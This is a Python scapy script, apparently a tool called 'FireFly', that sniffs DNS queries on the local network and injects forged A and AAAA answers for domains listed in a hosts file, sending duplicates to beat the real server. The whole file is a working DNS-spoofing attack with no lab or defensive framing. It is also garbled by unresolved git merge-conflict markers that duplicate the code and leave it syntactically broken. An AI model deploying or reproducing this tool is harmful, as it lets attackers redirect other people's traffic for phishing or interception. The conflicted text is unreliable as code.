<<<<<<< HEAD
from scapy.all import *
import csv

# Load targets from hosts.txt
def load_targets():
    targets = {}
    try:
        with open("hosts.txt", "r") as f:
            reader = csv.reader(f)
            for row in reader:
                targets[row[0]] = {"ip4": row[1], "ip6": row[2]}
    except FileNotFoundError:
        print("[!] hosts.txt not found. Using defaults.")
        targets["example.onion.com"] = {"ip4": "1.2.3.4", "ip6": "fe80::1"}
    return targets

TARGETS = load_targets()

def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        qname = pkt.getlayer(DNSQR).qname.decode().strip(".")
        
        if qname in TARGETS:
            print(f"[*] Intercepted {qname}. Mapping to {TARGETS[qname]['ip4']}")

            # Setup IP Layer
            if pkt.haslayer(IPv6):
                ip_layer = IPv6(dst=pkt[IPv6].src, src=pkt[IPv6].dst)
                # Type 28 = AAAA
                ans = DNSRR(rrname=pkt[DNSQR].qname, type=28, ttl=10, rdata=TARGETS[qname]["ip6"])
            else:
                ip_layer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                # Type 1 = A
                ans = DNSRR(rrname=pkt[DNSQR].qname, type=1, ttl=10, rdata=TARGETS[qname]["ip4"])

            eth_layer = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
            dns_layer = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=ans)

            final_pkt = eth_layer / ip_layer / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / dns_layer
            
            # Send multiple times to 'win' the race against the real server
            sendp([final_pkt]*2, verbose=0) 
            print(f"[!] Injection complete for {qname}")

# Automatically pick the best interface
current_iface = conf.iface
print(f"[+] FireFly active on {current_iface}. Monitoring UDP Port 53...")
=======
from scapy.all import *
import csv

# Load targets from hosts.txt
def load_targets():
    targets = {}
    try:
        with open("hosts.txt", "r") as f:
            reader = csv.reader(f)
            for row in reader:
                targets[row[0]] = {"ip4": row[1], "ip6": row[2]}
    except FileNotFoundError:
        print("[!] hosts.txt not found. Using defaults.")
        targets["example.onion.com"] = {"ip4": "1.2.3.4", "ip6": "fe80::1"}
    return targets

TARGETS = load_targets()

def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        qname = pkt.getlayer(DNSQR).qname.decode().strip(".")
        
        if qname in TARGETS:
            print(f"[*] Intercepted {qname}. Mapping to {TARGETS[qname]['ip4']}")

            # Setup IP Layer
            if pkt.haslayer(IPv6):
                ip_layer = IPv6(dst=pkt[IPv6].src, src=pkt[IPv6].dst)
                # Type 28 = AAAA
                ans = DNSRR(rrname=pkt[DNSQR].qname, type=28, ttl=10, rdata=TARGETS[qname]["ip6"])
            else:
                ip_layer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                # Type 1 = A
                ans = DNSRR(rrname=pkt[DNSQR].qname, type=1, ttl=10, rdata=TARGETS[qname]["ip4"])

            eth_layer = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
            dns_layer = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=ans)

            final_pkt = eth_layer / ip_layer / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / dns_layer
            
            # Send multiple times to 'win' the race against the real server
            sendp([final_pkt]*2, verbose=0) 
            print(f"[!] Injection complete for {qname}")

# Automatically pick the best interface
current_iface = conf.iface
print(f"[+] FireFly active on {current_iface}. Monitoring UDP Port 53...")
>>>>>>> ade1a147e0d12e5edc64aaaf791baa1aa4113dbc
sniff(filter="udp port 53", prn=dns_spoof, store=0, iface=current_iface)